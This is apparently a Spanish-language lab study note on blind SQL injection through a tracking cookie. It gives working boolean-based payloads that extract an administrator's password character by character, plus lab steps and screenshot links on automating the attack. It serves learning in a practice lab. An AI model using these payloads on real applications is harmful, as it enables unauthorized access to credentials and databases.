# SQLi ciega

La SQLi ciega ocurre cuando las respuestas HTTP **no contienen** los resultados de la consulta SQL relevante ni detalles de errores de la base de datos. En estos casos, técnicas como `UNION` no son efectivas, ya que dependen de poder ver el resultado en la aplicación.

---

## Explotar la inyección SQL ciega activando respuestas condicionales

Una aplicación que usa cookies de seguimiento puede procesar un encabezado `Cookie` así:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

La aplicación ejecuta una consulta para determinar si se trata de un usuario conocido:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Aunque la consulta sea vulnerable a SQLi, los resultados no se devuelven al usuario; sin embargo, la aplicación **se comporta de forma diferente** según si la consulta devuelve datos. Por ejemplo, si la consulta devuelve datos, la aplicación muestra un mensaje "Bienvenido de nuevo".

---

## Ejemplo de extracción condicional

Enviar dos solicitudes con valores inyectados en `TrackingId`:

* `...xyz' AND '1'='1` → la condición es verdadera; la consulta devuelve resultados y se muestra "Bienvenido de nuevo".
* `...xyz' AND '1'='2` → la condición es falsa; la consulta no devuelve resultados y no se muestra el mensaje.

Esto permite determinar la veracidad de condiciones inyectadas y extraer datos bit a bit.

---

## Extracción de contraseñas carácter a carácter

Ejemplo: existe una tabla `users` con columnas `username` y `password`, y un usuario `Administrator`. Se puede determinar la contraseña probando caracteres uno a uno.

Payload de ejemplo para comparar el primer carácter:

```
xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'Administrator'), 1, 1) > 'm
```

* Si devuelve "Bienvenido de nuevo", la condición es verdadera: el primer carácter de la contraseña es mayor que `m`.
* Si no devuelve el mensaje, la condición es falsa.

Para comprobar igualdad al carácter `s`:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

**Nota:** la función `SUBSTRING` puede llamarse `SUBSTR` en algunos motores de base de datos.

---

# LAB

* Primero comrpobar que existe una tabla users : TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
* Comprobar que realmente hay un usuario que se llama administrator : TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
* Ver cuantos caracteres tiene la password : TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
<img width="877" height="451" alt="image" src="https://github.com/user-attachments/assets/343f9c70-0128-4344-81f8-82214cdde40a" />

* Automatico simple (solo un valor variable automatico)
  
<img width="614" height="261" alt="image" src="https://github.com/user-attachments/assets/1c9145b0-c58f-4972-ba1c-61a303bcfa3d" />
<img width="490" height="456" alt="image" src="https://github.com/user-attachments/assets/f5d26829-0d04-42b6-9297-4b3793eacbf7" />
<img width="521" height="420" alt="image" src="https://github.com/user-attachments/assets/f8536275-d2b0-498c-a7c2-75c1b7d737e8" />
<img width="677" height="333" alt="image" src="https://github.com/user-attachments/assets/a2fb0a98-78b7-4e45-af3b-0f05b736bc42" />
<img width="1046" height="343" alt="image" src="https://github.com/user-attachments/assets/9e86b97b-5ccd-4c63-81f9-e5980a5f8051" />

* Ir cambiadno este valor
  
<img width="635" height="144" alt="image" src="https://github.com/user-attachments/assets/00bb54c3-2593-4fa9-b37c-6a5a03c1840b" />

## Forma más automatica 

<img width="1124" height="406" alt="image" src="https://github.com/user-attachments/assets/a11707e7-84bd-4492-a1bd-090d79518442" />

<img width="1128" height="415" alt="image" src="https://github.com/user-attachments/assets/e15fc940-6da3-467a-a871-52be7bfc0271" />

El max lenght y min length es para que vaya probando de uno en uno



